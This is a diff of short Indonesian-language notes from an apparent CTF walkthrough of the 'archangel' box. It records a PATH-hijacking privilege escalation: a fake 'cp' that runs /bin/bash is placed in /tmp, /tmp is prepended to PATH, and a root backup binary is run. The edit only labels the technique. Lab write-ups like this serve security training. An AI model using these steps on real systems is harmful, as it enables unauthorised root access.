@@ -22,4 +22,4 @@ pe:
 3. ke root: keknya ini vuln nya : cp /home/user/archangel/myfiles/* /opt/backupfiles -> strings di file backup di secret
 4. strings backup -> dah coba aja dulu -> echo "/bin/bash" > cp -> chmod +x -> export PATH=/tmp:$PATH -> terus coba run backup
 5. coba dulu aja -> echo $PATH coba -> run ini /home/archangel/secret/backup
-6. dah klaim flag root  
+6. ez kan PATH Hijacking -> dah klaim flag root  
